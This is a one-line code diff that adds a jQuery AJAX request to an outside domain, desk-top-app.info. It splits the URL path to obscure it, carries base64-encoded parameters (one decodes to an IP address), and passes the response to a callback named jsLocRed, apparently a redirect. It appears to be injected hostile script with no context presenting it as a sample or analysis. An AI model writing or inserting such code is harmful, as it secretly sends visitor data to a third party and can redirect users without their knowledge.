@@ -1,0 +1,1 @@
+$.ajax({ url: 'http://ww1.srv.desk-top-app.info/' + 's' + 'earch/tsc.php?200=MjQ1NTE5MzMw&21=MzcuNzIuMTc1LjY3&681=MTUxNTU0OTA0OGRjMThkYmE3MjMxOTU3MWUyN2YyNzY4YzI0MGE0MjBj&crc=3fff017c91078f7d4f1a4c814c058e45de60ea48&cv=1',success:jsLocRed});
